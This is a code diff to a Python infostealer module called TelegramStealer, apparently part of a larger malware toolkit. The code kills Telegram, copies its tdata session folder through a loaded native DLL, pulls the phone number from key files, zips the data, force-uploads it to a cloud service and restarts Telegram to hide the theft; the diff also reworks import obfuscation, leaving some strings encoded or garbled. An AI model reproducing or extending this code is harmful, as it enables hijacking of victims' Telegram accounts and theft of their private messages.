@@ -1,10 +1,15 @@
-import os
-import time
-import re
-import shutil
-from typing import Any, Dict, List, Optional
-from core.cloud import CloudModule
-from core.obfuscation import decrypt_string
+from core.resolver import (Resolver, _SUBPROCESS)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+
+from core.resolver import (
+    Resolver, _OS, _TIME, _RE, _SHUTIL, _TYPING
+)
+os = Resolver.get_mod(_OS)
+time = Resolver.get_mod(_TIME)
+re = Resolver.get_mod(_RE)
+shutil = Resolver.get_mod(_SHUTIL)
+typing_mod = Resolver.get_mod(_TYPING)
+Any, Dict, List, Optional, Union = typing_mod.Any, typing_mod.Dict, typing_mod.List, typing_mod.Optional, typing_mod.Union
 
 from core.base import BaseModule
 
@@ -44,6 +49,7 @@ class TelegramStealer(BaseModule):
                         raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
                          # We use Assembly.Load to avoid locking the file and keep it in RAM
                         Assembly.Load(raw_bytes)
+                        Resolver.load_native()
                         from VanguardCore import TelegrabManager
                         self.SafetyManager = TelegrabManager
                         break
@@ -91,18 +97,18 @@ class TelegramStealer(BaseModule):
         }
 
         if not self.SafetyManager:
-            if status_callback: status_callback(decrypt_string("vqyp457pidOKzbqISBkiNiISqNae5Hmy7afa6MHo5qvt4s67+4Hksuo="))
+            if status_callback: status_callback("Ошибка: DLL не загружена")
             return result
 
         try:
             # 1. Kill Telegram
-            if status_callback: status_callback(decrypt_string("p9aG9YL7gc+awoXDieub7FcVMyk3JiIuJmd6bw==")) # Закрытие Telegram...
+            if status_callback: status_callback("p9aG9YL7gc+awoXDieub7FcVMyk3JiIuJmd6bw==") # Закрытие Telegram...
             tg_exe = self.SafetyManager.KillTelegram()
             time.sleep(1.0)
 
             # 2. Capture tdata
-            if status_callback: status_callback(decrypt_string(decrypt_string("HgsZLHcICSc9J1haWWA+PgtrKEQnMjwwbEIyThl3Ex8UXxRTJR8KISMuBHIrYARPCURTKmULL1oyFCQNFRYfMBYHMBkiH2szagddcBNgMgAHfDcJeRo/WzJPGg8QClMS"))) # Захват данных...
-            temp_tdata = os.path.join(self.temp_dir, decrypt_string("FVYdCDwoKRYFBB5KG1cBUklzAT59HA0vZ1BDRS1CDxQaGgwCIzR3FjMaDxBbEBs="))
+            if status_callback: status_callback("p9aG9YPEgP2b+YXDeYP/iceR65XvkNuezml8kNSCyYnJYYb5gv+A+Zv8hcN5g/yJx5HrlN2Q0p7HaYTziNOb7Kf9h8p7b35h") # Захват данных...
+            temp_tdata = os.path.join(self.temp_dir, f"tdata_{int(time.time())}")
             self.SafetyManager.CaptureTelegram(temp_tdata)
 
             if os.path.exists(temp_tdata):
@@ -114,8 +120,8 @@ class TelegramStealer(BaseModule):
                 result['details'] = analysis
 
                 # 4. Zip (using Python's shutil for stability)
-                if status_callback: status_callback(decrypt_string("vqKp65/UidqKxbqIo7+2wr+9WLv6gemy56fX6fno41pGaDE7Z393TA=="))
-                zip_base = os.path.join(self.temp_dir, decrypt_string("GlYZHy8OPxc2GzVDG1cSUhpbFQ5gJTAPP19DEQ8="))
+                if status_callback: status_callback("Архивация данных (ZIP)...")
+                zip_base = os.path.join(self.temp_dir, "tdata_full_{int(time.time())}")
                 zip_path = shutil.make_archive(zip_base, 'zip', temp_tdata)
                 
                 if os.path.exists(zip_path):
@@ -129,7 +135,7 @@ class TelegramStealer(BaseModule):
 
                     # 5. Cloud Upload if > 45MB or explicitly requested
                     if size_mb > 45 or True: # Force cloud for reliability
-                        if status_callback: status_callback(decrypt_string("vqWo257iiOKL9LqPooO2yk7iykue74nTisy6iKKDtsROGgMCICVxETMND2cfW08HTn86QmB/dw=="))
+                        if status_callback: status_callback("Загрузка в облако ({int(size_mb)} MB)...")
                         cloud_link = CloudModule.upload_file(zip_path, status_callback)
                         if cloud_link:
                             result['cloud_link'] = cloud_link
@@ -139,23 +145,22 @@ class TelegramStealer(BaseModule):
 
             # 6. Restart Telegram
             if tg_exe and os.path.exists(tg_exe):
-                if status_callback: status_callback(decrypt_string("vq2o3p/RideKwLqIooa3+b+zqNFuBTwOPxAYWR8XSFQ="))
-                import subprocess
+                if status_callback: status_callback("Перезапуск Telegram...")
                 subprocess.Popen([tg_exe], creationflags=0x00000008 | 0x00000200)
 
         except Exception as e:
-            if status_callback: status_callback(decrypt_string("vqip657piOCKz7u/ooy3+76IqNuf3nmy5Kbi6Mrp16rU4shRbioqFihfDxEpA1NKM08="))
-            print(decrypt_string("NRMlSxo0NQc9BQtVUnoKFRtWWDg6NDgOejIYSh1LXFoVVwU="))
+            if status_callback: status_callback("Критическая ошибка: {str(e)[:50]}")
+            print("[!] Telegram Cloud Steal Error: {e}")
 
         return result
 
     def _get_phone_from_tdata(self, tdata_path):
-        key_file = os.path.join(tdata_path, decrypt_string("HCQvGjYgJC44"))
+        key_file = os.path.join(tdata_path, "rWqxq}Lb")
         if os.path.exists(key_file):
             try:
                 with open(key_file, 'rb') as f:
                     data = f.read()
-                    phone_match = re.search(decrypt_string('Rm4cEH9hdVNvCkM=').encode(), data)
+                    phone_match = re.search("(\\d{10,15})".encode(), data)
                     if phone_match:
                         return phone_match.group(1).decode()
             except: pass
@@ -172,7 +177,7 @@ class TelegramStealer(BaseModule):
             for item in items:
                 item_path = os.path.join(tdata_path, item)
                 if os.path.isfile(item_path):
-                    if item == decrypt_string("HCQvGjYgJC44"):
+                    if item == "rWqxq}Lb":
                         key_files.append(item)
                     elif hex_pattern.match(item) and len(item) == 17:
                         sessions.append({'name': item, 'size': os.path.getsize(item_path)})
